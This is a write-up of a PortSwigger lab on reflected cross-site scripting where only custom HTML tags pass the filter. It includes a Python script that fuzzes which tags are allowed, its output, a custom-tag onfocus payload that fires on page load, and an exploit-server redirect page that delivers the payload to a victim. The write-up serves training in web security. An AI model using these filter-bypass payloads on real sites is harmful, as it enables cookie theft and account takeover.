# Reflected XSS into HTML context with all tags blocked except custom ones

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked), you'll learn: Reflected XSS into HTML context with all tags blocked except custom ones! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231072352.png)

In here, we can see there is a search box.

Let's try to inject a JavaScript code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231072439.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231072446.png)

However, the application blocks us from injecting XSS payloads.

**Let's try to fuzz which tag(s) is allowed via a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(tag):
    payload = f'<{tag}>'
    url = f'https://0ae200dc03aace24c3c41b0600d800c3.web-security-academy.net/?search={payload}'

    requestResult = requests.get(url + tag)

    if 'Tag is not allowed' not in requestResult.text:
        print(f'[+] Found valid tag: {payload}')

def main():
    # From PortSwigger Cross-site scripting (XSS) cheat sheet:
    # https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    listTags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']

    for tag in listTags:
        thread = Thread(target=sendRequest, args=(tag,))
        thread.start()
        sleep(0.05)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Cross-Site-Scripting]
└─# python3 tag_fuzzing.py 
[+] Found valid tag: <a2>
[+] Found valid tag: <animatemotion>
[+] Found valid tag: <animatetransform>
[+] Found valid tag: <animate>
[+] Found valid tag: <audio2>
[+] Found valid tag: <custom tags>
[+] Found valid tag: <iframe2>
[+] Found valid tag: <image3>
[+] Found valid tag: <image2>
[+] Found valid tag: <img2>
[+] Found valid tag: <input2>
[+] Found valid tag: <input3>
[+] Found valid tag: <input4>
[+] Found valid tag: <set>
[+] Found valid tag: <video2>
```

Then, go to PortSwigger's [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to see which tags can perform XSS:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231073034.png)

After some searching, I found that only custom tag works.

**Let's pick one payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231073312.png)

This payload looks ok.

However, we want the XSS payload don't require user interaction.

**To fix that, we can add an anchor (`#x`) at the end of the URL:**
```html
?search=<xss id=x tabindex=1 onfocus=alert(document.cookie)></xss>#x
```

Let's try that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231075214.png)

It worked!

**Now, we need to go to the exploit server, host the HTML payload file, and deliver it to victim.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231073535.png)

**Final payload:**
```html
<html>
    <head>
        <title>XSS-18</title>
    </head>
    <body>
        <script>
            window.location.replace("https://0ae200dc03aace24c3c41b0600d800c3.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus=alert(document.cookie)></xss>#x"); 
        </script>
    </body>
</html>
```

When the victim visit our web page, he/she will be redirected to the XSS payload.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231075458.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-18/images/Pasted%20image%2020221231075511.png)

Nice!

# What we've learned:

1. Reflected XSS into HTML context with all tags blocked except custom ones